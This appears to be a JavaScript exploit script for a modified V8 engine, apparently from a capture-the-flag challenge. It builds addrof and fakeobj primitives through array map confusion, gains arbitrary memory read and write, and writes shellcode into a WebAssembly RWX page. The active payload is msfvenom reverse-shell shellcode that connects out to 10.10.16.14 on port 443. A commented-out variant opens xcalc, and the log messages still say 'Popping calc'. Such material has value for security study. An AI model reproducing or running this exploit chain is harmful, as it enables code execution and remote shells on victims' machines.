// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // watch for little endianess
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// Construct addrof primitive
// var temp_obj = {"A": 1}
// var obj_arr = [temp_obj];
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map2 = fl_arr.GetLastElement();
var map1 = itof(0x50n + ftoi(map2));

function addrof(in_obj) {
    // First, set map to obj array's map
    fl_arr.SetLastElement(map1);

    // Put the obj whose address we want to find into index 0
    fl_arr[0] = in_obj;

    // Change the obj array's map to the float array's map
    fl_arr.SetLastElement(map2);

    // Get the address by accessing index 0
    let addr = fl_arr[0];

    // Return the address as a BigInt
    return ftoi(addr);
}

function fakeobj(addr) {
    // First, put the address as a float into index 0 of the float array
    fl_arr[0] = itof(addr);

    // Change the float array's map to the obj array's map
    fl_arr.SetLastElement(map1);

    // Get the "fake" object at that memory location and store it
    let fake = fl_arr[0];

    // Set the map back
    fl_arr.SetLastElement(map2);

    // Return the object
    return fake;
}

// This array is what we will use to read from and write to arbitrary memory addresses
var arb_rw_arr = [map2, 1.2, 1.3, 1.4];

console.log("[+] Controlled float array: 0x" + addrof(arb_rw_arr).toString(16));

function arb_read(addr) {
    // We have to use tagged pointers for reading, so we tag the addr
    if (addr % 2n == 0) addr += 1n;

    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to addr-0x8
    let mask_it = (BigInt(addr) - 0x8n) & 0xffffffffn
    let length = BigInt(0x8n * 0x100000000n);
    arb_rw_arr[1] = itof(mask_it + length);

    // Index 0 will then return the value at addr
    return ftoi(fake[0]);
}

function basic_arb_write(addr, val) {
    // We have to use tagged pointers for reading, so we tag the addr
    if (addr % 2n == 0) addr += 1n;

    // Place a fakeobj right on top of our crafted array with a float array map
    let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);

    // Change the elements pointer using our crafted array to addr-0x8
    let mask_it = (BigInt(addr) - 0x8n) & 0xffffffffn
    let length = BigInt(0x8n * 0x100000000n);
    arb_rw_arr[1] = itof(mask_it + length);

    fake[0] = itof(BigInt(val));
}

function arb_write(addr, val) {
    let buf = new ArrayBuffer(8);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);

    // Calculate the backing_store address
    let bs_addr = buf_addr + 0x20n;
    
    basic_arb_write(bs_addr, addr);
    dataview.setBigUint64(0, BigInt(val), true);
}

// https://wasdk.github.io/WasmFiddle/

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

var rwx_page_addr = arb_read(addrof(wasm_instance) - 1n + 0x68n);

console.log("[+] RWX WASM page addr: 0x" + rwx_page_addr.toString(16));

function copy_shellcode(addr, shellcode) {
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addrof(buf);

    let bs_addr = buf_addr + 0x14n;

    basic_arb_write(bs_addr, addr);

    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

// https://xz.aliyun.com/t/5003

// Open xcalc
// var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.14 LPORT=443 -f c -o payload.c
var shellcode = [0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x90909090,0x296a9090,0x26a9958,0x5e016a5f,0x9748050f,0x2b948,0xa0abb01,0x48510e10,0x106ae689,0x582a6a5a,0x36a050f,0xceff485e,0xf58216a,0x6af67505,0x4899583b,0x69622fbb,0x68732f6e,0x89485300,0x485752e7,0x50fe689];

console.log("[+] Copying xcalc shellcode to RWX page");

copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] Popping calc");

f();
